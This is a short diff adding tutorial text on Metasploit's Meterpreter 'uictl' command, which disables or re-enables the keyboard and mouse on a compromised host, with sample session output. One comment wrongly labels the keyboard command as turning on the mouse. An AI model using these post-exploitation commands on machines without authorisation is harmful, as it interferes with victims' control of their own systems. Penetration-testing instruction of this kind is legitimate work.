@@ -1,0 +1,14 @@
+If you need to disable the keyboard or mouse, the uictl command is used. It accepts the following parameters:
+
+uictl [enable/disable] [keyboard/mouse]
+
+Enable - turns on; disable - disables. :)
+
+meterpreter > uictl disable mouse #Disable the mouse
+Disabling mouse...
+meterpreter > uictl enable mouse #Turn on the mouse
+Enabling mouse...
+meterpreter > uictl disable keyboard #Disable the keyboard
+Disabling keyboard...
+meterpreter > uictl enable keyboard #Turn on the mouse
+Enabling keyboard...
